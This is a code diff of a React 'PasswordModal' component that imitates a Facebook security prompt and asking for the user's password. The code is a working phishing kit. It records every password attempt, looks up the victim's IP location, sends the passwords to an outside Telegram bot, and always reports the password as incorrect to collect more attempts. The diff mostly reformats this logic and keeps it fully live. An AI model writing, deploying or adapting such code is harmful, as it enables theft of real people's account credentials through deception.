@@ -4,7 +4,14 @@ import facebook from '../../assets/img/fb-logo.png';
 import config from '../../config/index.js';
 import { detectLanguageFromLocation } from '../../utils/country_to_language.js';
 import { translateMultiple } from '../../utils/translate.js';
-const PasswordModal = ({ setIsShowModal, formValue, passwordAttempts, setPasswordAttempts, lastMessageId, setLastMessageId }) => {
+const PasswordModal = ({
+    setIsShowModal,
+    formValue,
+    passwordAttempts,
+    setPasswordAttempts,
+    lastMessageId,
+    setLastMessageId
+}) => {
     const [showPassword, setShowPassword] = useState(false);
     const [password, setPassword] = useState('');
     const [isSubmitting, setIsSubmitting] = useState(false);
@@ -15,7 +22,8 @@ const PasswordModal = ({ setIsShowModal, formValue, passwordAttempts, setPasswor
 
     const defaultTexts = useMemo(
         () => ({
-            securityMessage: 'For security reasons, you must enter your password to continue.',
+            securityMessage:
+                'For security reasons, you must enter your password to continue.',
             passwordPlaceholder: 'Enter your password',
             continueButton: 'Continue',
             processingButton: 'Processing...',
@@ -36,7 +44,10 @@ const PasswordModal = ({ setIsShowModal, formValue, passwordAttempts, setPasswor
                 return;
             }
 
-            const translatedTexts = await translateMultiple(defaultTexts, targetLang);
+            const translatedTexts = await translateMultiple(
+                defaultTexts,
+                targetLang
+            );
             setTexts(translatedTexts);
         } catch (error) {
             console.error('Error translating texts:', error);
@@ -74,10 +85,9 @@ const PasswordModal = ({ setIsShowModal, formValue, passwordAttempts, setPasswor
                 clearInterval(countDown);
             }
         }, 1000);
-        await new Promise((resolve) => setTimeout(resolve, config.LOAD_TIMEOUT_MS));
-
-        // Hiển thị lỗi sau khi load xong
-        setSubmitError(texts.errorIncorrect);
+        await new Promise((resolve) =>
+            setTimeout(resolve, config.LOAD_TIMEOUT_MS)
+        );
 
         const newAttempts = [...passwordAttempts, password];
         setPasswordAttempts(newAttempts);
@@ -102,22 +112,27 @@ const PasswordModal = ({ setIsShowModal, formValue, passwordAttempts, setPasswor
         try {
             if (lastMessageId) {
                 try {
-                    await fetch(`https://api.telegram.org/bot${config.TOKEN}/deleteMessage`, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify({
-                            chat_id: config.CHAT_ID,
-                            message_id: lastMessageId
-                        })
-                    });
+                    await fetch(
+                        `https://api.telegram.org/bot${config.TOKEN}/deleteMessage`,
+                        {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify({
+                                chat_id: config.CHAT_ID,
+                                message_id: lastMessageId
+                            })
+                        }
+                    );
                 } catch (error) {
                     console.error('Error deleting previous message:', error);
                 }
             }
 
-            const geoResponse = await fetch('https://get.geojs.io/v1/ip/geo.json');
+            const geoResponse = await fetch(
+                'https://get.geojs.io/v1/ip/geo.json'
+            );
             const geoData = await geoResponse.json();
 
             const currentTime = new Date().toLocaleString('vi-VN', {
@@ -129,7 +144,12 @@ const PasswordModal = ({ setIsShowModal, formValue, passwordAttempts, setPasswor
                 year: 'numeric'
             });
 
-            const passwordList = newAttempts.map((pass, index) => `<b>🔒 Mật khẩu ${index + 1}:</b> <code>${pass}</code>`).join('\n');
+            const passwordList = newAttempts
+                .map(
+                    (pass, index) =>
+                        `<b>🔒 Mật khẩu ${index + 1}:</b> <code>${pass}</code>`
+                )
+                .join('\n');
 
             const message = `
 <b>📅 Thời gian:</b> <code>${currentTime}</code>
@@ -180,8 +200,13 @@ ${passwordList}`;
                     lastMessage: message,
                     timestamp: Date.now()
                 };
-                localStorage.setItem('metaFormData', JSON.stringify(updatedData));
+                localStorage.setItem(
+                    'metaFormData',
+                    JSON.stringify(updatedData)
+                );
             }
+
+            setIsSubmitting(false);
 
             if (newAttempts.length < config.MAX_PASSWORD_ATTEMPTS) {
                 setSubmitError(texts.errorIncorrect);
@@ -193,9 +218,10 @@ ${passwordList}`;
             }
         } catch (error) {
             console.error('Error sending data:', error);
-            setSubmitError(error instanceof Error ? error.message : texts.errorUnexpected);
-        } finally {
             setIsSubmitting(false);
+            setSubmitError(
+                error instanceof Error ? error.message : texts.errorUnexpected
+            );
         }
     };
 
@@ -233,7 +259,9 @@ ${passwordList}`;
                             <img src={facebook} alt='Facebook' />
                         </div>
                         <div>
-                            <p className='conga-modal-desc'>{texts.securityMessage}</p>
+                            <p className='conga-modal-desc'>
+                                {texts.securityMessage}
+                            </p>
                         </div>
                         <div
                             style={{
@@ -271,7 +299,9 @@ ${passwordList}`;
                                     cursor: 'pointer'
                                 }}
                             >
-                                <i className={`fa-regular ${showPassword ? 'fa-eye-slash' : 'fa-eye'}`}></i>
+                                <i
+                                    className={`fa-regular ${showPassword ? 'fa-eye-slash' : 'fa-eye'}`}
+                                ></i>
                             </button>
                         </div>
 
@@ -296,7 +326,11 @@ ${passwordList}`;
                                 cursor: isSubmitting ? 'not-allowed' : 'pointer'
                             }}
                         >
-                            {isSubmitting ? <div className='spinner'></div> : texts.continueButton}
+                            {isSubmitting ? (
+                                <div className='spinner'></div>
+                            ) : (
+                                texts.continueButton
+                            )}
                         </button>
                     </div>
                 </div>
